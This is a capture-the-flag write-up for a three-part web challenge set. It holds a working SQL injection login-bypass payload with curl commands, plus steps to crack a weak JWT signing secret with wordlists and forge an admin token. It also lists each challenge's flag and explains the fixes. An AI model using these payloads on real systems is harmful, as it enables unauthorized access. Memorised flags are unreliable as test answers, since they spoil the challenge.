# Floor 9 — Biotech Lab & Server Room
## PUC Intra CTF: Zombie Outbreak | Web Exploitation | 750 pts

---

> *It's 3:47 AM. The building is locked down. You're in the server room on the 9th floor and the lab's internal portal is still running on the terminal in front of you. Someone left it open.*

---

## Challenge Overview

| # | Name | Type | Points |
|---|---|---|---|
| 1 | Residual Session | Antidote | 100 |
| 2 | Default Credentials Override | Stairs | 250 |
| 3 | Elevator Control JWT | Lift | 400 |

**Target:** `http://<target>:5009`

---

## Antidote — Residual Session (100 pts)

### What's going on?

You land on a login page for the **Biotech Research Portal**. Nothing obvious on the screen — just a username and password field with a dark terminal aesthetic. But the challenge says a technician left something behind before the outbreak.

The word "residual" in the challenge title is the nudge. Residual data. Leftover data. Something that wasn't cleaned up.

### The approach

Before attacking a login form, always read the source. Developers constantly leave debug notes, credentials, TODO comments — things that were "supposed to be removed before deploy" but never were. This is one of the most common real-world oversights.

```bash
curl -s http://<target>:5009/login
```

Or in the browser: **Ctrl+U** (View Page Source).

### What you find

Right at the top, tucked inside an HTML comment:

```html
<!--
  TODO: remove before deploy.
  Antidote fragment: PUCTF{f9_r3s1du4l_s3ss10n_n0t3}
  Note to self: Dr. Rahman's encrypted notes use shift key = 7.
  Door override creds still default.
-->
```

There it is. The developer committed the cardinal sin of leaving debug comments in production HTML. The flag is sitting right there for anyone who bothers to read the source.

But notice there's more here than just the flag. Two hints embedded for later:
- **"shift key = 7"** — this feeds into Floor 8's Caesar cipher challenge
- **"door override creds still default"** — this hints at the Stairs challenge below

### Flag
```
PUCTF{f9_r3s1du4l_s3ss10n_n0t3}
```

---

## Stairs — Default Credentials Override (250 pts)

### What's going on?

The stairwell door control panel uses the same login system. The antidote note said "door override creds still default" — so maybe try `admin/admin`? But the challenge is rated medium, so there's more to it than that.

### The approach

The real hint isn't just "default creds" — it's the word **"override"** and the context that this is a web challenge. When a login form exists and you can't guess the password, the next move is **SQL injection**.

The backend query is built by directly concatenating user input into a SQL string:

```sql
SELECT * FROM users WHERE username='$user' AND password='$pass'
```

This is a textbook vulnerable query. If you insert a single quote into the username field, you break out of the string literal and can inject your own SQL logic.

### Crafting the payload

The classic SQLi login bypass:

```
username: admin' OR '1'='1' --
password: anything
```

What this does to the query:

```sql
SELECT * FROM users WHERE username='admin' OR '1'='1' -- ' AND password='anything'
```

The `--` comments out everything after it, including the password check entirely. The `OR '1'='1'` makes the WHERE clause always evaluate to true. The database returns the first row, the login succeeds, and you're redirected to `/stairwell/unlock`.

### Testing it

```bash
curl -s -c cookies.txt -X POST http://<target>:5009/login \
  --data-urlencode "username=admin' OR '1'='1' -- " \
  --data-urlencode "password=x"

curl -s -b cookies.txt http://<target>:5009/stairwell/unlock
```

The page renders with the flag.

### Why this works

The app uses Python's `sqlite3` with raw f-string interpolation — there's no parameterized query, no escaping, nothing standing between your input and the database. This is exactly what **SQLi** has been exploiting since the late 90s. The fix is one line: use `?` placeholders instead of string formatting.

### Flag
```
PUCTF{sql1_st41rw3ll_4cc3ss_gr4nt3d}
```

---

## Lift — Elevator Control JWT (400 pts)

### What's going on?

The elevator override system is separate from the main login. It uses **JWT (JSON Web Token)** authentication. The server will hand you a guest token for free — but you need an admin token to actually trigger the override.

### Step 1 — Get the guest token

```bash
curl -s http://<target>:5009/elevator/guest-token
```

Response:
```json
{
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoiZ3Vlc3QifQ.XXXXX"
}
```

Paste that token into [jwt.io](https://jwt.io) and decode it. The payload reads:

```json
{
  "user": "guest",
  "role": "guest"
}
```

The algorithm is `HS256` — HMAC with SHA-256. This means the token is signed with a **secret string**. If that secret is weak or guessable, you can forge any token you want.

### Step 2 — Crack the signing secret

`HS256` tokens are signed with a symmetric key. The server signs and verifies with the same secret. If the secret is in a wordlist, it's crackable offline — you don't need to touch the server at all.

**Using jwt_tool:**
```bash
jwt_tool <token> -C -d /usr/share/wordlists/rockyou.txt
```

**Using hashcat (mode 16500):**
```bash
echo "<token>" > token.txt
hashcat -m 16500 token.txt wordlist.txt
```

The secret cracks quickly: **`elevator123`** — a weak password that belongs on a password hall of shame.

### Step 3 — Forge an admin token

Now that you have the secret, you can sign anything you want. Create a new token with `role: admin`:

```python
import jwt

admin_token = jwt.encode(
    {"user": "admin", "role": "admin"},
    "elevator123",
    algorithm="HS256"
)
print(admin_token)
```

### Step 4 — Submit it

```bash
curl -s -X POST http://<target>:5009/elevator/override \
  -H "Authorization: Bearer <your_forged_admin_token>"
```

Response:
```json
{
  "status": "OVERRIDE ACCEPTED",
  "flag": "PUCTF{jwt_4dm1n_3l3v4t0r_unl0ck3d}"
}
```

### Why this works

JWT with `HS256` is only as secure as its secret. A secret like `elevator123` gives an attacker everything — once cracked offline, they can impersonate any user, claim any role, and the server has no way to tell the difference between a real token and a forged one. Production systems should use long random secrets (32+ bytes) or switch to asymmetric signing (`RS256`) where the private key never leaves the server.

### Flag
```
PUCTF{jwt_4dm1n_3l3v4t0r_unl0ck3d}
```

---

## Scoreboard

```
[✓] PUCTF{f9_r3s1du4l_s3ss10n_n0t3}         100 pts
[✓] PUCTF{sql1_st41rw3ll_4cc3ss_gr4nt3d}     250 pts
[✓] PUCTF{jwt_4dm1n_3l3v4t0r_unl0ck3d}       400 pts
                                        TOTAL: 750 pts
```

*The stairwell door grinds open. Floor 8 is below.*
